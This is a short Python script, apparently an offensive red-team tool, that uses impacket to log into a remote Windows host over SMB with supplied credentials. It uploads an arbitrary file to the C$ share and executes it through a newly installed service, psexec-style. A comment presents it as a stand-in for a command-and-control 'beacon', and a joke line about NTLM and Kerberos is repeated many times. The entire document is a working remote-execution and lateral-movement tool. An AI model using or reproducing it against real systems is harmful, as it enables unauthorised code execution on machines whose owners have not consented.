# What if you wanted to use scamanger but you didn't happen to have a beacon?
# NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE NTLM IS FAKE KERBEROS IS A LIE 
from impacket.dcerpc.v5 import transport, epm, nrpc, scmr
from impacket.smbconnection import SMBConnection
from impacket.smb import SMB_DIALECT
from impacket.examples import remcomsvc, serviceinstall
import argparse

# Parse the command-line arguments
parser = argparse.ArgumentParser(description="Use psexec to upload and execute a file")
parser.add_argument("-t", "--target", required=True, help="The target hostname or IP address")
parser.add_argument("-u", "--username", required=True, help="The username to authenticate with")
parser.add_argument("-p", "--password", required=True, help="The password to authenticate with")
parser.add_argument("-sn", "--servicename", required=True, help="The service name to create")
parser.add_argument("-fn", "--filename", required=True, help="The file name to create")
parser.add_argument("-f", "--file", required=True, help="The file to upload and execute")
args = parser.parse_args()

# Create an SMB connection and authenticate
c = SMBConnection(args.target, args.target)
c.login(args.username, args.password)

# Upload the file
print("Uploading file %s" % args.file)
with open(args.file, "rb") as f:
    c.putFile("C$", args.file, f.read)
f = open(args.file, 'rb')
# Execute the file
print("Executing file %s" % args.file)
installService = serviceinstall.ServiceInstall(c, f, args.servicename, args.filename)
installService.install()
